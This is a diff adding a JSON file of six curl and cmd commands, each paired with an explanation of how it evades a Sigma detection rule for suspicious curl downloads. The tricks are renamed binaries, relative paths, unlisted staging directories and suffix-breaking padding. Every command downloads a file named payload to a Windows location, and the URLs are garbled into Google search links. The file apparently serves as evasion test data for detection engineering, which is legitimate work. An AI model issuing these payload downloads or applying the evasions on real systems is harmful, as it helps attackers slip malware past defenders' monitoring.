@@ -1,0 +1,26 @@
+[
+  {
+    "output": "curl.exe -o C:\\Users\\Public\\Downloads\\payload.exe [http://example.com/payload.exe](https://www.google.com/search?q=http://example.com/payload.exe)",
+    "explanation": "The rule specifically requires the command line string to end with a specific set of extensions via the 'selection_susp_extensions' condition (e.g., '.dll', '.txt', '.png'). By using an executable extension '.exe' which is omitted from the suffix list, the execution fails the rule criteria while achieving direct binary deployment."
+  },
+  {
+    "output": "curl.exe -o C:\\Users\\Public\\Downloads\\payload.dll -H \"X-Padding: ExtraString\"",
+    "explanation": "The 'CommandLine|endswith' logic is structurally fragile. By appending a completely benign HTTP header or random characters at the very end of the command string, the line concludes with a standard character or quotation mark instead of the target extensions, disrupting the suffix match."
+  },
+  {
+    "output": "curl.exe -o C:\\Users\\%USERNAME%\\payload.dll [http://example.com/payload.dll](https://www.google.com/search?q=http://example.com/payload.dll)",
+    "explanation": "The rule explicitly flags common payload drop sites such as '\\AppData\\', '\\Temp\\', or '%Public%'. Dropping the file directly into the current user's profile home directory ('C:\\Users\\') via the '%USERNAME%' environment variable satisfies the destination target while escaping the blacklisted keyword array."
+  },
+  {
+    "output": "cmd.exe /c \"copy C:\\Windows\\System32\\curl.exe C:\\Users\\Public\\Downloads\\update.exe && update.exe -o C:\\Users\\Public\\Downloads\\payload.dll [http://example.com/payload.dll](https://www.google.com/search?q=http://example.com/payload.dll)\"",
+    "explanation": "The 'selection_curl' logic relies entirely on the default system binary name ('\\curl.exe'). Copying the binary to a different location with an unsuspicious name overrides the binary image constraint, rendering the subsequent download operations invisible to this specific signature."
+  },
+  {
+    "output": "cmd.exe /c cd %TEMP% && curl.exe -s -o payload.exe [http://example.com/payload.exe](https://www.google.com/search?q=http://example.com/payload.exe)",
+    "explanation": "This bypasses the rule by utilizing a relative path. The 'selection_susp_locations' condition checks for specific path strings (like '%Temp%' or '\\Temp\\') explicitly within the curl command line. By changing the directory before invoking curl, the malicious path string is completely omitted from the curl.exe execution arguments. Additionally, '.exe' is notably absent from the 'selection_susp_extensions' list."
+  },
+  {
+    "output": "curl.exe --create-dirs -o C:\\Windows\\Tasks\\payload.dll [http://example.com/payload.dll?download=1](https://www.google.com/search?q=http://example.com/payload.dll%3Fdownload%3D1)",
+    "explanation": "This command evades detection in two ways: First, it targets 'C:\\Windows\\Tasks\\', which is a common staging directory but is missing from the 'selection_susp_locations' list. Second, it appends a query parameter to the URL. Because the Sigma rule uses 'CommandLine|endswith' for 'selection_susp_extensions', ending the command line with '1' instead of '.dll' prevents the extension condition from triggering."
+  }
+]
